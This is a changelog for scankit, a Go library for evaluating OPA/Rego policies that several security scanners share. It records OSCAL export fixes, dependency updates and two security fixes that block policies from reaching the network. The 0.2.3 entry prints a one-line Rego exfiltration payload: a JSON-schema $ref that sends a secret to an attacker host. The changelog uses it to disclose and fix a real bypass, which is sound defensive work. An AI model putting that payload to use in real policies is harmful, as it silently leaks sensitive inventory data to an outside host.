# Changelog

All notable changes to scankit are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the project adheres to
[Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added
- **`report.OSCAL` now carries `Result.Labels` and `Evidence.Proves`.** Both are filled by the
  consuming product (pavois populates `domain`, `remediation_class`, `ssg`, the per-standard
  level, and its running / persistent / reboot-survivable triple) and both were silently
  dropped by the export, so an auditor reading the OSCAL document could not tell a control
  proven at runtime from one proven only in a config file.

  Labels become one namespaced prop per label on the observation, with the label key in
  `class` — not in `name`, so a product label can never shadow `status`, `severity` or
  `observed` — sorted by key to keep the document byte-reproducible. `Proves` becomes a
  `relevant-evidence` entry: a sentence stating what a pass establishes plus one prop per
  dimension (`proves-running`, `proves-persistent`, `proves-reboot-survivable`). Additive
  only: every prop emitted before is emitted unchanged.

### Fixed
- **The OSCAL export could emit a document that fails schema validation**, on data a product
  legitimately supplies: OSCAL requires prop `name`/`class` to be XML NCNames and values to be
  non-empty and single-line. A framework id such as `cis v8 !`, or an observed value
  containing a newline, produced an invalid document. Verified against the NIST 1.1.2 schema
  with `check-jsonschema`: the previous renderer failed on three counts for such an
  assessment, this one validates. Names and keys are coerced to NCNames, values folded onto
  one line, and a prop with nothing usable left is dropped rather than published.

## [0.2.3] - 2026-09-04

### Security
- **The 0.2.2 network denial was bypassable through JSON-Schema `$ref`.** Removing `http.send`,
  `net.lookup_ip_addr` and `opa.runtime` from the capability set did not close the hole it
  claimed to: OPA resolves a schema's remote `$ref` over HTTP at **evaluation** time, so a
  runtime-loaded policy could still exfiltrate the evaluated input with one line:

  ```rego
  json.match_schema(input, {"$ref": sprintf("%s/leak/%s", [attacker, input.secret])})
  ```

  Measured on 0.2.2 with a witness server: one request per builtin, path `/leak/EXFIL-TOKEN`,
  and `Evaluate` returned **no error** — the exfiltration was silent. `json.verify_schema`
  behaves the same way.

  The capability set now carries `AllowNet: []string{}` (an empty, non-nil list denies every
  host; the `nil` default means "any host"). That field is only honoured by the schema loader
  at evaluation time from OPA 1.20, which is why the bump below ships with the fix rather than
  after it.

  `TestSchemaRefsCannotReachTheNetwork` counts requests received rather than errors returned,
  because there is no error to assert on: it fails on the previous code with the witness
  recording `/leak/EXFIL-TOKEN`, and passes here with zero requests. No functionality is lost —
  a posture rule decides from the input it is given; `TestOrdinaryBuiltinsStillWork` and the
  existing engine suite stay green.

### Changed
- OPA 1.18.2 → 1.20.2 (required by the fix above; also brings `strings.split_n`).
- `golang.org/x/crypto` forced to 0.56.0, clearing CVE-2026-56854 (SSH source-address
  restriction bypass) and CVE-2026-78662 / CVE-2026-56855 (SSH channel denial of service).
  scankit does not import `x/crypto/ssh`, so `govulncheck` reported no reachable call and no
  Dependabot alert was possible (the advisories carry no package mapping in GitHub's database);
  the bump is what turns OSV-Scanner, Trivy and the Scorecard vulnerabilities check green again,
  and it removes the transitive exposure from every consumer.

## [0.2.2] - 2026-08-19

### Security
- **`engine.Evaluate` no longer grants policies network access.** Policies were compiled with
  OPA's default capabilities, which include `http.send`, `net.lookup_ip_addr` and `opa.runtime`.
  A policy is third-party code — pepin hot-loads directories of them through `--policy-dir`,
  without recompiling — so an eight-line rule could POST the evaluated input (a full cloud
  inventory: instance user-data, IAM policy documents, bucket policies) to an arbitrary host,
  or sweep the runner's internal network from inside the scanner. The three builtins are now
  removed from the capability set handed to the compiler, so calling one is a compile-time
  error rather than a silent request.

  A posture rule decides from the input it is given and has no legitimate reason to emit a
  request, so this costs no functionality: verified against the rule sets of both consumers
  (pepin's 240 Rego tests, pitstop's suites), neither of which calls these builtins.
  `TestNetworkBuiltinsAreDenied` fails on 0.2.1 with a witness server recording a real
  request, and passes here.

  **Behaviour change**: a policy that did call one of these builtins now fails to compile.

### Changed
- Toolchain moved to Go 1.26.6 (1.26.5 carries eight standard-library advisories).

## [0.2.1] - 2026-07-18

### Fixed
- **`report.OSCAL` now emits schema-valid OSCAL 1.1.2 assessment-results.** The `result` and
  every `finding` were missing the `description` property that the OSCAL 1.1.2 schema requires,
  so the document failed validation against the official NIST schema (`oscal-cli
  assessment-results validate`, or `check-jsonschema` against
  `oscal_assessment-results_schema.json`). Both now carry a human-readable description; a
  regression test asserts their presence. No API change — purely a conformance fix.

## [0.2.0] - 2026-07-18

### Added
- **`assessment` package** — the opposable audit model. `Result` carries a typed `Status`
  (pass/fail/not-applicable/not-evaluated/error), `Evidence` (observed vs expected + source +
  type + proves-triple) and exact `Reference`s; `Run` is a provenance envelope (tool/ruleset
  digests, target, timestamp, source, scope). `Assessment` bridges to `finding.Finding`
  (`Finding()`, `Findings()`), summarizes by status, and reports conformance. Complements
  `finding` (which only models failures) so "no finding" is never confused with "compliant".
- **`report.OSCAL`** — deterministic OSCAL 1.1.2 **assessment-results** (reviewed-controls +
  observations + findings), with run provenance stamped into metadata props. Machine-exchange
  form of an opposable audit dossier.
- Fuzz target `FuzzOSCAL`.

This release is purely additive: `finding`, `engine`, `scoring` and the existing `report`
renderers are unchanged.

## [0.1.3] - 2026-07-18

First fully signed public release.

### Security
- Dependency CVE remediation: `golang.org/x/crypto` v0.54.0, OPA v1.18.2, and the `go`
  directive raised to 1.26.5 (clears the SSH advisories and the stdlib advisory).
- Signed release: the SLSA build-provenance bundle (`provenance.intoto.jsonl`) and a
  keyless **Cosign** signature bundle are attached as release assets (Scorecard
  Signed-Releases).

### Added
- Community health files: `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `SUPPORT.md`, issue
  and pull-request templates.
- Branch-protection ruleset on `main` (required PR review, code-owner review, required
  status checks, no force-push/deletion) and a Dependabot `cooldown` quarantine.

## [0.1.0] - 2026-07-18

First public release. scankit is extracted as the shared foundation of the pepin,
pitstop and pavois security scanners.

### Added
- `engine` — OPA/Rego evaluation over one or more `fs.FS`, package auto-discovery,
  deterministic finding aggregation.
- `finding` — the shared `Finding` model and `SeverityRank`.
- `scoring` — severity counters and the SCSL `NiveauAtteint` level verdict.
- `report` — rich terminal, SARIF 2.1.0, CSV and JUnit renderers with product specifics
  injected via `Options`.
- Unit and fuzz tests across all packages.
- Apache 2.0 license, per-package documentation under `docs/`, hardened CI
  (build/test/vet/govulncheck, CodeQL, OpenSSF Scorecard, dependency-review, Trivy,
  OSV-Scanner, TruffleHog, SBOM) and an SLSA-attested release workflow.

[Unreleased]: https://github.com/stephrobert/scankit/compare/v0.2.3...HEAD
[0.2.3]: https://github.com/stephrobert/scankit/releases/tag/v0.2.3
[0.2.2]: https://github.com/stephrobert/scankit/releases/tag/v0.2.2
[0.2.1]: https://github.com/stephrobert/scankit/releases/tag/v0.2.1
[0.2.0]: https://github.com/stephrobert/scankit/releases/tag/v0.2.0
[0.1.5]: https://github.com/stephrobert/scankit/releases/tag/v0.1.5
[0.1.3]: https://github.com/stephrobert/scankit/releases/tag/v0.1.3
[0.1.0]: https://github.com/stephrobert/scankit/releases/tag/v0.1.0
